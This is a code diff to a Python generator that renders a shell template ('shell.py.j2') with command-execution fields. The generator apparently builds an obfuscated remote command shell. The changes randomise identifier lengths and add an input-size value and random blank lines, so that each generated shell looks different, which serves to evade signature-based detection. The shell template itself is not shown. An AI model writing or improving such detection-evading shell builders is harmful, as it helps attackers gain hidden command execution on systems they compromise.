@@ -5,7 +5,7 @@ import pyperclip
 from jinja2 import Environment, FileSystemLoader
 
 def random_string():
-    length = random.randint(8, 32)  # Generate a random length between 8 and 32
+    length = random.randint(5, 100)  # Generate a random length between 5 and 100
     return ''.join(random.choice(string.ascii_letters) for _ in range(length))
 
 def xor_encrypt(data, key):
@@ -18,6 +18,27 @@ def render_template(template_name, **kwargs):
     env = Environment(loader=FileSystemLoader('./'))
     template = env.get_template(template_name)
     return template.render(**kwargs)
+
+def add_random_newlines(template, max_newlines=5):
+    """
+    Adds random newlines to a given template string at the end of lines to avoid breaking the code.
+    
+    :param template: str - The original multiline template string.
+    :param max_newlines: int - The maximum number of newlines to add.
+    :return: str - The mutated template string with newlines added.
+    """
+    # Split the template into lines
+    lines = template.splitlines()
+    
+    # Select random line indices to add newlines after them
+    newline_positions = sorted(random.sample(range(len(lines)), min(max_newlines, len(lines))))
+
+    # Add extra newlines to the selected lines
+    for index in newline_positions:
+        lines[index] += '\n' * random.randint(1, 5)  # Add between 1 and 5 newlines
+    
+    # Reassemble the template with the added newlines
+    return '\n'.join(lines)
 
 def obfuscate_code(key):
     # Find and replace all template variables
@@ -59,10 +80,15 @@ def obfuscate_code(key):
         'Execute_Command': random_string(),
         'Execute_Encrypted_Command': random_string(),
         'Enter_Encrypted_Command': random_string(),
+        'inputSize': random.randint(5, 250),
         'SubmitValue': random_string(),
     }
 
-    return render_template('shell.py.j2', **to_replace)
+    # Load the template and render it with the variables
+    obfuscated_code = render_template('shell.py.j2', **to_replace)
+
+    # Add random newlines to the obfuscated code
+    return add_random_newlines(obfuscated_code, 100)
 
 def main():
     key = random_string()    
